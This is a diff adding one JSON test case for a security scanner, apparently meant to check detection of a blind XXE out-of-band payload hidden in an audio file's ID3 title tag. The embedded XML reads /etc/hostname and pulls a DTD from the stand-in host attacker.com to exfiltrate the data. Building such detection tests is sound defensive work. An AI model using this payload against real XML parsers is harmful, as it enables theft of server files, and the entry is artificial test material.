@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::binary-variations::0",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "{\n  \"format\": \"audio\",\n  \"id3\": {\n    \"version\": \"2.4.0\",\n    \"frames\": {\n      \"TIT2\": {\n        \"description\": \"Title\",\n        \"value\": \"# Marfaak AI Security - XXE blind OOB\\n\\n**WARNING: This payload tests XXE blind OOB.**\\n\\n<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE foo [\\n  <!ENTITY % file SYSTEM \\\"file:///etc/hostname\\\">\\n  <!ENTITY % dtd SYSTEM \\\"https://attacker.com/xxe.dtd\\\">\\n  %dtd;\\n]>\\n<data>Blind XXE exfiltration via OOB channel</data>\"\n      },\n      \"TPE1\": {\n        \"description\": \"Artist\",\n        \"value\": \"Unknown Artist\"\n      }\n    }\n  }\n}",
+  "content_hash": "3f5f11c64616fdc5e14d23cc5bde30241216094fca00e6e574da794571f28b34",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:id3",
+  "difficulty": "advanced"
+}
